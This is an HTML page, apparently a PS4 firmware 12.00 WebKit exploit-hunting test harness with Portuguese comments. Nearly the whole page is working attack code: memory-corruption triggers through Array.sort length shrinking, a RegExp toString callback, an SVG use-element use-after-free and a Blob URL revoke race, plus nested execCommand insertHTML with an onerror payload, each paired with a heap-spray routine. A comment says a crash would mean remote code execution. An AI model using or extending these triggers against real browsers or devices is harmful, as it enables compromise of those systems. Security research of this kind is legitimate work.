<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 FW 12.00 :: Hunter V11 (Fix & Destroy)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 15px; width: 100%; margin: 5px 0; font-size: 16px; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        #log { height: 200px; overflow-y: scroll; border: 1px dashed #444; margin-top: 20px; padding: 10px; color: #ddd; }
    </style>
</head>
<body>

    <h1>PS4 V11: TARGETED RE-TEST</h1>
    <p>Foco: Array.sort, RegExp, SVG ShadowDOM e Blob Race.</p>

    <button onclick="runTest32_Fixed()">RE-TEST 32: Array.sort OOB (Script Fixed)</button>
    <button onclick="runTest16_Fixed()">RE-TEST 16: RegExp Replace (Script Fixed)</button>
    <button onclick="runTest51()">TEST 51: SVG 'Use' Element Shadow Tree UAF</button>
    <button onclick="runTest52()">TEST 52: Blob URL Revoke + XHR (Variant of Test 10)</button>
    <button onclick="runTest53()">TEST 53: Command 'InsertHTML' Nesting</button>

    <div id="log">Logs...</div>

    <script>
        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        // --- FUNÇÃO CORRIGIDA E GLOBAL ---
        // Esta função deve estar acessível a todos os testes
        var sprayStore = [];
        function sprayHeap() {
            log(">> EXECUTANDO HEAP SPRAY <<");
            try {
                for(let i=0; i<2000; i++) {
                    // Cria buffers de tamanhos variados para fragmentar e ocupar
                    let b = new Uint8Array(128); 
                    b.fill(0x41);
                    sprayStore.push(b);
                    
                    let f = new Float64Array(64);
                    f.fill(1.23456789); // Padrão específico de float
                    sprayStore.push(f);
                }
            } catch(e) {
                log("Erro no Spray: " + e);
            }
        }

        // --- RE-TEST 32: Array.sort (Corrigido) ---
        // Se este teste crashar, é execução de código remota (RCE).
        function runTest32_Fixed() {
            log("Iniciando Re-Test 32 (Sort)...");
            var arr = [];
            for(var i=0; i<100; i++) arr[i] = Math.random();
            
            function maliciousCompare(a, b) {
                // Diminui o array no meio da ordenação
                if (arr.length === 100) {
                    log("Trigger! Reduzindo array...");
                    arr.length = 0; 
                    sprayHeap(); // Agora a função existe!
                }
                return a - b;
            }

            try {
                arr.sort(maliciousCompare);
                log("Sort finalizado sem crash.");
            } catch(e) {
                log("Erro JS: " + e);
            }
        }

        // --- RE-TEST 16: RegExp Replace (Corrigido) ---
        function runTest16_Fixed() {
            log("Iniciando Re-Test 16 (RegExp)...");
            try {
                var o = {
                    toString: function() {
                        log("Callback toString! Destruindo...");
                        sprayHeap(); 
                        return "X";
                    }
                };
                var str = "A".repeat(10000); 
                // O WebKit pode tentar acessar o buffer da string original que foi movido/liberado
                var result = str.replace(/A/g, o);
                log("RegExp OK. Length: " + result.length);
            } catch(e) {
                log("Erro JS: " + e);
            }
        }

        // --- TESTE 51: SVG 'Use' Element Shadow Tree ---
        // O elemento <use> clona elementos SVG criando uma "Shadow Tree".
        // Manipular o original enquanto o clone é renderizado é perigoso.
        function runTest51() {
            log("Iniciando Test 51: SVG Use UAF...");
            
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
            let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
            g.id = "target";
            
            // Cria estrutura profunda
            let c = g;
            for(let i=0; i<50; i++) {
                let n = document.createElementNS("http://www.w3.org/2000/svg", "g");
                c.appendChild(n);
                c = n;
            }
            
            defs.appendChild(g);
            svg.appendChild(defs);
            
            let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
            use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
            svg.appendChild(use);
            document.body.appendChild(svg);
            
            // Força renderização da Shadow Tree
            let bbox = use.getBBox();
            
            log("Shadow Tree criada. Mutando original...");
            
            // Remove o alvo original. A instância 'use' deve ser atualizada.
            g.remove();
            sprayHeap();
            
            // Tenta acessar propriedades do clone órfão
            try {
                log("BBox pós-remoção: " + use.getBBox().width);
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 52: Blob URL Race (XHR Variant) ---
        // Variação do Teste 10 que causou OOM. Usamos XHR Síncrono para tentar travar o estado.
        function runTest52() {
            log("Iniciando Test 52: Blob Sync Race...");
            
            let data = new Uint8Array(1024 * 1024 * 20); // 20MB
            data.fill(0x41);
            let blob = new Blob([data]);
            let url = URL.createObjectURL(blob);
            
            let xhr = new XMLHttpRequest();
            xhr.open("GET", url, true); // Assíncrono para iniciar
            xhr.responseType = "arraybuffer";
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 2 || xhr.readyState === 3) {
                    log("Download em progresso. REVOGANDO!");
                    
                    // Revoga a URL e elimina a referência ao Blob
                    URL.revokeObjectURL(url);
                    blob = null;
                    data = null;
                    
                    // Spray massivo para tentar pegar a memória do Blob liberado
                    // Se o XHR continuar lendo 'data', ele lerá o nosso spray
                    sprayHeap();
                }
            };
            
            xhr.onload = function() {
                log("Download terminou. Tamanho: " + (xhr.response ? xhr.response.byteLength : 0));
                // Verifica se houve corrupção (se leu lixo do spray)
                if (xhr.response) {
                    let view = new Uint8Array(xhr.response);
                    // Se começar com 0x41 (A) é original. Se tiver lixo, é UAF.
                    log("Primeiro byte: " + view[0]);
                }
            };
            
            xhr.send();
        }

        // --- TESTE 53: Command InsertHTML Nesting ---
        // Abusa do 'execCommand' que funcionou no Teste 3.
        // Tenta inserir HTML recursivamente dentro de eventos de edição.
        function runTest53() {
            log("Iniciando Test 53: execCommand Nesting...");
            
            let div = document.createElement('div');
            div.contentEditable = true;
            document.body.appendChild(div);
            div.focus();
            
            // Prepara listener de input
            div.addEventListener('input', function handler() {
                log("Input detectado! Inserindo recursivamente...");
                div.removeEventListener('input', handler); // Evita loop infinito simples
                
                // Executa comando DENTRO do processamento de outro comando
                document.execCommand('insertHTML', false, '<img src=x onerror="log(\'XSS?\')">');
                
                // Destroi o editor
                div.remove();
                sprayHeap();
            });
            
            // Dispara o primeiro comando
            try {
                document.execCommand('insertHTML', false, '<b>TRIGGER</b>');
            } catch(e) {
                log("Erro comando: " + e);
            }
        }

    </script>
</body>
</html>
